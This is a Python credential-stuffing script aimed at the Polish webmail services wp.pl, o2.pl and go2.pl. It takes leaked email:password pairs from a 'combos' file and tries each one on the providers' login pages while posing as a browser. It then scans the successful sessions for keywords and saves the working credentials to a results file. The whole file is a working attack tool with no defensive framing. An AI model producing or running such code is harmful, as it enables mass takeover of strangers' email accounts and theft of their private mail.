import requests
import os
from colorama import init, Fore, Style

init(autoreset=True)

def load_keywords():
    if os.path.exists("keywords.txt"):
        with open("keywords.txt", "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]
    return []

def check_web_and_search_mail(email, password, keywords):
    domain = email.split('@')[1].lower()
    
    if domain == 'wp.pl':
        login_url = "https://konto.wp.pl/login.html"
    elif domain in ['o2.pl', 'go2.pl']:
        login_url = "https://poczta.o2.pl/login/login.html"
    else:
        return 'skipped'

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Referer": login_url,
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    payload = {
        "login": email,
        "password": password
    }

    try:
        session = requests.Session()
        # محاولة تسجيل الدخول عبر الويب
        response = session.post(login_url, data=payload, headers=headers, timeout=10, allow_redirects=True)
        
        if response.status_code == 200:
            # التحقق هل فشل تسجيل الدخول أم نجح
            if "błędne" not in response.text.lower() and "error" not in response.text.lower():
                
                # إذا نجح الدخول، نقوم بالبحث عن الكلمات المفتاحية إذا وُجدت في رسائل البريد أو الواجهة
                found_keywords = {}
                for kw in keywords:
                    if kw.lower() in response.text.lower():
                        found_keywords[kw] = 1
                
                return {'status': 'hit', 'keywords': found_keywords}
            else:
                return 'bad'
        else:
            return 'bad'
    except Exception:
        return 'error'

def main():
    print(Fore.CYAN + "=== Polish Web Login & Keywords Checker (wp.pl, o2.pl, go2.pl) ===" + Style.RESET_ALL)
    
    keywords = load_keywords()
    print(Fore.YELLOW + f"Loaded {len(keywords)} keywords from keywords.txt" + Style.RESET_ALL)
    
    if not os.path.exists("combos.txt"):
        print(Fore.RED + "Error: combos.txt not found!" + Style.RESET_ALL)
        return
        
    os.makedirs("Results", exist_ok=True)
    hit_file = open("Results/hits_with_keywords.txt", "a", encoding="utf-8")
    
    with open("combos.txt", "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line or ':' not in line:
                continue
                
            parts = line.split(':')
            email = parts[0].strip()
            password = ":".join(parts[1:]).strip()
            
            domain = email.split('@')[-1].lower()
            if domain not in ['wp.pl', 'o2.pl', 'go2.pl']:
                continue
                
            print(Fore.WHITE + f"Checking: {email}..." + Style.RESET_ALL, end=" ")
            result = check_web_and_search_mail(email, password, keywords)
            
            if isinstance(result, dict) and result['status'] == 'hit':
                print(Fore.GREEN + "[HIT & CHECKED]" + Style.RESET_ALL)
                hit_file.write(f"{email}:{password} | Found Keywords: {result['keywords']}\n")
                hit_file.flush()
            else:
                print(Fore.RED + "[BAD / Locked]" + Style.RESET_ALL)
                
    hit_file.close()
    print(Fore.GREEN + "\nFinished checking!" + Style.RESET_ALL)

if __name__ == "__main__":
    main()
